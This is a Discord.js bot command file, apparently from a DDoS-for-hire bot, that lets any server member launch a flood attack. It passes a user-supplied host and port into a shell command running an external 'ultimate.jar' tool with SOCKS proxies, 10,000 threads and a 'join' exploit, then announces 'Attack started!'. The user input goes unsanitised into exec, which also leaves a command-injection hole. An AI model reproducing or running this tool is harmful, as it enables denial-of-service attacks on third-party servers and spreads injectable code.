const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar ultimate.jar host=${host} port=${port} proxiesFile=socks_proxies.txt threads=10000 attackTime=1 exploit=join`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTimestamp()
	.setDescription("**► Method: Botfucker 💥** \n \n ► Attack started! ✅ \n ► for 120 seconds! 🕒 \n © Developer Avion")
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['ultimate'],
  permLevel: 0
}

exports.help = {
  name: 'botfucker',
  description: 'Özel',
  usage: 'botfucker'
}
